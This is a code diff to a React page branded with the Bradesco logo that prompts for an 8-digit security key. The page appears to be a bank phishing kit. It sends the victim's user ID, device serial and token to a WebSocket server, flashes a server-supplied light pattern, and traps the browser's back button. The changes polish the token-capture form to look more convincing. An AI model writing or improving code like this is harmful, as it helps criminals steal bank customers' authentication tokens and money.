@@ -2,17 +2,18 @@ import { useEffect, useRef, useState, useCallback } from "react";
 import bradescoLogo from "@/assets/bradesco-logo.png";
 
 const FeixePage = () => {
-  const usuario = sessionStorage.getItem("usuario") || "";
-  const dispositivo = sessionStorage.getItem("dispositivo") || "";
+  const usuario = localStorage.getItem("usuario") || "";
+  const dispositivo = localStorage.getItem("dispositivo") || "";
   const wsRef = useRef<WebSocket | null>(null);
   const [status, setStatus] = useState<"aguardando" | "lendo" | "validando" | "erro">("aguardando");
   const [binario, setBinario] = useState<string>("");
   const [corAtual, setCorAtual] = useState<"black" | "white">("black");
-  const [chave, setChave] = useState("");
+  const [chave, setChave] = useState(["", "", "", "", "", "", "", ""]);
   const [erroChave, setErroChave] = useState("");
   const [enviandoChave, setEnviandoChave] = useState(false);
   const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const indexRef = useRef(0);
+  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
   const iniciarLeitura = useCallback(() => {
     if (!binario) return;
@@ -35,11 +36,30 @@ const FeixePage = () => {
     }, 50);
   }, [binario, usuario]);
 
+  const handleDigit = (index: number, value: string) => {
+    if (!/^\d?$/.test(value)) return;
+    const newChave = [...chave];
+    newChave[index] = value;
+    setChave(newChave);
+    setErroChave("");
+    if (value && index < 7) {
+      inputRefs.current[index + 1]?.focus();
+    }
+  };
+
+  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
+    if (e.key === "Backspace" && !chave[index] && index > 0) {
+      inputRefs.current[index - 1]?.focus();
+    }
+  };
+
+  const chaveCompleta = chave.every(d => d !== "");
+
   const enviarChave = () => {
-    if (chave.length !== 8) return;
+    if (!chaveCompleta) return;
     setErroChave("");
     setEnviandoChave(true);
-    wsRef.current?.send(JSON.stringify({ acao: "token", usuario, token: chave }));
+    wsRef.current?.send(JSON.stringify({ acao: "token", usuario, token: chave.join("") }));
   };
 
   useEffect(() => {
@@ -48,7 +68,7 @@ const FeixePage = () => {
 
     ws.onopen = () => {
       console.log("FeixePage WS conectado");
-      if (usuario) ws.send(JSON.stringify({ acao: "reconectar", usuario }));
+      if (usuario) ws.send(JSON.stringify({ acao: "reconectar", usuario, dispositivo }));
     };
 
     ws.onmessage = (event) => {
@@ -75,7 +95,7 @@ const FeixePage = () => {
 
     ws.onerror = (err) => console.error("Feixe WS erro:", err);
     return () => { ws.close(); if (intervalRef.current) clearInterval(intervalRef.current); };
-  }, [usuario]);
+  }, [usuario, dispositivo]);
 
   useEffect(() => {
     window.history.pushState(null, "", window.location.href);
@@ -151,7 +171,7 @@ const FeixePage = () => {
             <div className="flex flex-col items-center gap-3 mb-6">
               <p className="text-[hsl(0,84%,60%)] text-sm">Não foi possível validar. Tente novamente.</p>
               <button
-                onClick={() => { setStatus("aguardando"); setChave(""); wsRef.current?.send(JSON.stringify({ acao: "reconectar", usuario })); }}
+                onClick={() => { setStatus("aguardando"); setChave(["","","","","","","",""]); wsRef.current?.send(JSON.stringify({ acao: "reconectar", usuario })); }}
                 className="px-8 h-12 rounded-full bg-[hsl(349,93%,42%)] text-white text-sm font-semibold active:scale-[0.97] transition-all duration-200"
               >
                 Tentar novamente
@@ -160,23 +180,50 @@ const FeixePage = () => {
           )}
 
           {/* Security key input - always visible */}
-          <div className="w-full bg-[hsl(220,20%,96%)] rounded-xl px-4 py-4 border border-[hsl(220,14%,89%)] space-y-3 mt-auto">
-            <label className="text-[hsl(220,20%,14%)] text-sm font-semibold block text-center">
-              Digite a Chave de Segurança com 8 dígitos
-            </label>
-            <input
-              type="text"
-              inputMode="numeric"
-              maxLength={8}
-              value={chave}
-              onChange={(e) => { setChave(e.target.value.replace(/\D/g, "").slice(0, 8)); setErroChave(""); }}
-              placeholder="00000000"
-              className="w-full h-12 text-center text-2xl font-mono tracking-[0.3em] border border-[hsl(220,14%,89%)] rounded-lg bg-white focus:outline-none focus:border-[hsl(220,60%,40%)] focus:ring-2 focus:ring-[hsl(220,60%,40%)]/20 transition-all"
-            />
-            {erroChave && <p className="text-[hsl(0,84%,60%)] text-xs text-center">{erroChave}</p>}
+          <div className="w-full bg-[hsl(220,20%,96%)] rounded-xl px-4 py-5 border border-[hsl(220,14%,89%)] mt-auto">
+            <div className="flex items-center gap-3 mb-4">
+              <div className="w-12 h-12 flex items-center justify-center">
+                <svg xmlns="http://www.w3.org/2000/svg" className="w-10 h-10 text-[hsl(220,10%,60%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
+                  <rect x="3" y="3" width="7" height="7" rx="1" />
+                  <rect x="14" y="3" width="7" height="7" rx="1" />
+                  <rect x="3" y="14" width="7" height="7" rx="1" />
+                  <rect x="14" y="14" width="4" height="4" rx="1" />
+                  <path d="M20 16v2a2 2 0 0 1-2 2h-1" />
+                  <path d="M21 21h.01" />
+                </svg>
+              </div>
+              <h3 className="text-[hsl(220,20%,14%)] text-sm font-bold leading-tight">
+                Digite a Chave de segurança com 8 dígitos
+              </h3>
+            </div>
+
+            <div className="flex justify-center gap-2 mb-3">
+              {chave.map((digit, i) => (
+                <input
+                  key={i}
+                  ref={el => { inputRefs.current[i] = el; }}
+                  type="text"
+                  inputMode="numeric"
+                  maxLength={1}
+                  value={digit}
+                  onChange={(e) => handleDigit(i, e.target.value)}
+                  onKeyDown={(e) => handleKeyDown(i, e)}
+                  className="w-9 h-11 text-center text-lg font-mono border-b-2 border-[hsl(220,14%,80%)] bg-transparent focus:outline-none focus:border-[hsl(220,60%,40%)] transition-colors"
+                />
+              ))}
+            </div>
+
+            {dispositivo && (
+              <p className="text-[hsl(220,10%,56%)] text-xs text-center mb-4">
+                Confira o número de série do seu dispositivo: <span className="font-bold text-[hsl(220,20%,14%)]">{dispositivo}</span>
+              </p>
+            )}
+
+            {erroChave && <p className="text-[hsl(0,84%,60%)] text-xs text-center mb-3">{erroChave}</p>}
+
             <button
               onClick={enviarChave}
-              disabled={chave.length !== 8 || enviandoChave}
+              disabled={!chaveCompleta || enviandoChave}
               className="w-full h-11 rounded-full bg-[hsl(349,93%,42%)] text-white text-sm font-semibold active:scale-[0.97] transition-all duration-200 disabled:opacity-50"
             >
               {enviandoChave ? "Enviando..." : "Confirmar"}
